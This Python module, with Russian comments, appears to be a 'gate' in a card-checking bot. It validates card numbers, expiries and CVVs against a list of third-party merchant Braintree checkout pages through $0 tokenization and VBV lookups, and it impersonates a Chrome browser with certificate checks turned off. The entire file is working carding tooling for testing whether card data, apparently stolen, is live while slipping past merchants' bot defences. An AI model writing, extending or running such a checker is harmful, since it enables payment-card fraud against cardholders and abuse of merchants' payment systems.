# language: Python 3.12+, file: bot/gates/braintreenvbv.py, target: Windows 11
# Фаза 5: Braintree VBV lookup gate ($0 токенизация, вердикт по cvvResponseCode).
import asyncio
import os
import sys
from pathlib import Path

import gate_client as gc
from curl_cffi.requests import AsyncSession
import pusto_logger as log

NAME = "braintreenvbv"
COST = 1

_sem = asyncio.Semaphore(5)  # A6: сессия своя на вызов — сериализация не нужна


def _targets() -> list[str]:
    t = os.environ.get("PUSTO_BT_TARGETS", "")
    if t:
        return [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    p = Path(__file__).resolve().parents[2] / "data" / "braintree_targets.txt"
    if p.exists():
        return [ln.strip().rstrip("/") for ln in
                p.read_text(encoding="utf-8").splitlines() if ln.strip().startswith("http")]
    return []


def _normalize(cc, mm, yy, cvv) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc) <= 19) or not gc.check_luhn(cc):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not 1 <= month <= 12:
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(cc, mm, yy, cvv) -> tuple[str, str]:
    masked = gc.mask_pan(cc)
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        log.log_warn(f"[braintreenvbv] invalid card format / Luhn failed for {masked}")
        return ("INVALID", "bad card format / Luhn fail")
    targets = _targets()
    if not targets:
        log.log_error("braintreenvbv", "no braintree targets configured (env PUSTO_BT_TARGETS / data/braintree_targets.txt)")
        return ("ERROR", "no braintree targets (env PUSTO_BT_TARGETS)")
    async with _sem:
        for target in targets:
            log.log_target("braintreenvbv", target)
            log.log_gate("braintreenvbv", masked, "CHECKING", f"target={target}")
            try:
                async with AsyncSession(impersonate="chrome131", verify=False) as s:
                    r = await s.get(target, timeout=10)
                    res = await gc.braintree_vbv_check(s, r.text, raw, target)
            except Exception as e:
                log.log_warn(f"[braintreenvbv] target {target} failed: {type(e).__name__}: {e}")
                res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
            if res["status"] != "ERROR":
                log.log_gate("braintreenvbv", masked, res["status"], res["detail"][:80])
                return (res["status"], res["detail"])
        log.log_error("braintreenvbv", f"all {len(targets)} targets failed for {masked}")
        return ("ERROR", f"all {len(targets)} targets failed")

